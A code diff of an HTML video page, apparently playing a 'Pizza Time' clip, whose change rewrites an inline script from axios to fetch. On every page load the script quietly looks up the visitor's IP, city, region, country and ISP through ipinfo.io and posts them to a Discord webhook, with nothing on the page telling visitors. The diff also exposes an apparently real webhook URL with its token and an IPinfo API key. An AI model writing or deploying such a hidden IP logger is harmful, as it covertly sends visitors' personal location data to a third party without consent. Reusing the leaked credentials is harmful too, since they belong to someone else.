@@ -79,45 +79,49 @@
     <source id="video-source" src="/che - Pizza Time.mp4" type="video/mp4">
     Your browser does not support HTML5 video.
   </video>
-  <script>
-    // IPinfo.io API token
-    const apiKey = '6f609cfc9e5326';  // Replace with your IPinfo API key
+<script>
+  // IPinfo.io API token
+  const apiKey = '6f609cfc9e5326';  // Replace with your IPinfo API key
 
-    // Discord webhook URL (replace with your actual webhook URL)
-    const webhookURL = 'https://discord.com/api/webhooks/1338567908896542768/Y3rwmCvW8cF2C8ov2KXFx5t8Bk62tzPhMch8du265f-wH_eCUn6KgNYKsSNMBTlQnUCG';
+  // Discord webhook URL (replace with your actual webhook URL)
+  const webhookURL = 'https://discord.com/api/webhooks/1338567908896542768/Y3rwmCvW8cF2C8ov2KXFx5t8Bk62tzPhMch8du265f-wH_eCUn6KgNYKsSNMBTlQnUCG';
 
-    // Function to fetch IP info and send to Discord webhook
-    function logVisitor() {
-      // Get visitor IP and location from IPinfo API
-      axios.get(`https://ipinfo.io?token=6f609cfc9e5326`)
-        .then(function(response) {
-          const ipData = response.data;
-          
-          const embedData = {
-            "embeds": [{
-              "title": "New Visitor",
-              "description": `IP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.region}, ${ipData.country}\nOrg: ${ipData.org}`,
-              "color": 3066993,  // Green color for embed
-            }]
-          };
-          
-          // Send IP data to Discord via Webhook
-          axios.post(webhookURL, embedData)
-            .then(() => {
-              console.log('Visitor data sent to Discord!');
-            })
-            .catch((error) => {
-              console.error('Error sending data to Discord:', error);
-            });
+  // Function to fetch IP info and send to Discord webhook
+  function logVisitor() {
+    // Fetch IP info from IPinfo API
+    fetch(`https://ipinfo.io?token=${apiKey}`)
+      .then(response => response.json())  // Parse the response as JSON
+      .then(ipData => {
+        const embedData = {
+          "embeds": [{
+            "title": "New Visitor",
+            "description": `IP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.region}, ${ipData.country}\nOrg: ${ipData.org}`,
+            "color": 3066993,  // Green color for embed
+          }]
+        };
+
+        // Send IP data to Discord via Webhook
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(embedData)
         })
-        .catch(function(error) {
-          console.error('Error fetching IP data:', error);
-        });
-    }
+          .then(() => {
+            console.log('Visitor data sent to Discord!');
+          })
+          .catch((error) => {
+            console.error('Error sending data to Discord:', error);
+          });
+      })
+      .catch((error) => {
+        console.error('Error fetching IP data:', error);
+      });
+  }
 
-    // Call logVisitor function on page load
-    logVisitor();
-  </script>
+  // Call logVisitor function on page load
+  logVisitor();
+</script>
+
 
   <script>
     const videos = [
